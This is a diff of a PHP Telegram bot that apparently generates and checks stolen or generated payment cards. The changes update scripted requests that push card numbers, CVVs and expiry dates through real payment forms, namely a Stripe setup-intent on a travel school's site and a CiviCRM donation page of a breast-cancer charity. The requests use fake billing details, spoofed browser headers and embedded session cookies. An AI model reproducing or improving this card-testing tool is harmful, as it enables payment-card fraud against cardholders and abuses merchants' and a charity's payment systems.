@@ -783,7 +783,8 @@ $si = substr($message, 5);
 
 if($si != ''){
 }else{
-$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
+//$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
+$respuesta = "🚫 Oops!\nUse this format: /gen xxxxxx\n";
 sendMessage($chat_id,$respuesta,$message_id);
 die();
 }
@@ -1411,14 +1412,25 @@ $num = "$cc$mes$ano1$cvv";
 //-----------------------------------------------------//
 
 
-//Verifi//
-if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+
+$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
+if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
     $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
     sendMessage($chat_id, $respuesta, $message_id);
     die();
 }
 
 
+
+//Verifi//
+/*
+if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
+    sendMessage($chat_id, $respuesta, $message_id);
+    die();
+}
+
+*/
 
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
@@ -2604,7 +2616,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce=6a6837e266',
+  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
   CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
@@ -2769,6 +2781,8 @@ $ano   = $i[2];
 $cvv   = $i[3];
 $bin = substr($lista, 0, 6);
 
+$mes = explode("|", $lista);
+$mes = intval($mes[1]);
 
 //Verifi//
 if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
@@ -2819,12 +2833,17 @@ curl_setopt_array($curl, [
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'upgrade-insecure-requests: 1',
-    'accept-language: es-US,es;q=0.9',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
+    'sec-fetch-site: none',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-dest: document',
+    'priority: u=0, i',
   ],
 ]);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2853,7 +2872,7 @@ curl_setopt_array($curl, [
   CURLOPT_CUSTOMREQUEST => 'POST',
   CURLOPT_POSTFIELDS => [
     'qfKey' => ''.$qfKey.'',
-    'MAX_FILE_SIZE' => '67108864',
+    'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
     'hidden_processor' => '1',
     'payment_processor_id' => '3',
     'priceSetId' => '5',
@@ -2874,7 +2893,7 @@ curl_setopt_array($curl, [
     'custom_30' => '',
     'credit_card_type' => ''.$MV.'',
     'credit_card_number' => ''.$cc.'',
-    'cvv2' => ''.$cvv.'',
+    'cvv2' => $cvv,
     'credit_card_exp_date[M]' => ''.$mes.'',
     'credit_card_exp_date[Y]' => ''.$ano.'',
     'billing_first_name' => 'Carlos',
@@ -2883,30 +2902,30 @@ curl_setopt_array($curl, [
     'billing_street_address-5' => '6195 bollinger rd',
     'billing_city-5' => 'New york',
     'billing_country_id-5' => '1228',
-    'billing_state_province_id-5' => '1002',
+    'billing_state_province_id-5' => '1058',
     'billing_postal_code-5' => '10010',
     '_qf_Main_upload' => '1',
   ],
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
-  CURLOPT_HTTPHEADER => [
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
+    CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+    CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',                                                                                       
+    CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
-//    'cache-control: max-age=0',
-//    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-//    'sec-ch-ua-mobile: ?1',
+    'cache-control: max-age=0',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'origin: https://breastcancereducation.org',
-//    'content-type: multipart/form-data; boundary=----WebKitFormBoundarya03U4Y25Snzw7o5r',
-//    'upgrade-insecure-requests: 1',
-//    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
-//    'sec-fetch-site: same-origin'
-//    'sec-fetch-mode: navigate',
-//    'sec-fetch-user: ?1',
-//    'sec-fetch-dest: document',
+            //    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryf5wcYWFVprKL61RK',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
     'referer: https://breastcancereducation.org/make-a-donation',
-//    'priority: u=0, i',
+    'priority: u=0, i',
   ],
 ]);
 
@@ -2927,15 +2946,15 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'cache-control: max-age=0',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.7',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
@@ -2950,15 +2969,11 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-$response = curl_exec($curl);
-$err = curl_error($curl);
 $patron = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
 preg_match($patron, $response, $coincidencias);
 $qfKey2 = $coincidencias[1];
-//echo "qfKey: $qfKey2\n";
-
+echo "qfKey: $qfKey2\n";
 curl_close($curl);
-
 
 
 
@@ -2971,8 +2986,8 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm%3Anext&custom_28=&custom_29=&custom_31=&custom_30=&_qf_Confirm_next=1',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
+  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm%3Anext&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
@@ -2985,7 +3000,7 @@ curl_setopt_array($curl, [
     'origin: https://breastcancereducation.org',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.7',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
@@ -3001,7 +3016,6 @@ curl_close($curl);
 
 
 
-
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey2.'',
@@ -3011,7 +3025,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
@@ -3019,7 +3033,7 @@ curl_setopt_array($curl, [
     'cache-control: max-age=0',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.7',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
@@ -3027,7 +3041,7 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfkey2.'',
     'priority: u=0, i',
   ],
 ]);
